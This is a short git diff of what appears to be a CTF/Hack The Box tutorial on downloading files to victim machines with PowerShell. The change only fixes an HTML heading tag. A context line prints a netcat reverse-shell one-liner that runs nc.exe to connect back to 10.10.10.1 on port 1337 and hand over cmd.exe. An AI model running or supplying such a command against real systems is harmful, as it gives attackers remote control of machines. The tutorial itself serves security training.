@@ -27,7 +27,7 @@ This command first calls PowerShell to run a command with the `-c` flag. This is
 
 We could further this command by then calling `& c:\temp\nc.exe -e cmd.exe 10.10.10.1 1337` to connect back to our reverse shell (but that is outside of this article) to further our attack as a one-liner.
 
-<h2>System.Net.WebClient<h2>
+<h2>System.Net.WebClient</h2>
 
 However, I frequently find that this is not the preferred method in Hack The Box or other CTF's to download files to victims. This brings us to our next approach, using PowerShell's `System.Net.WebClient`:
 
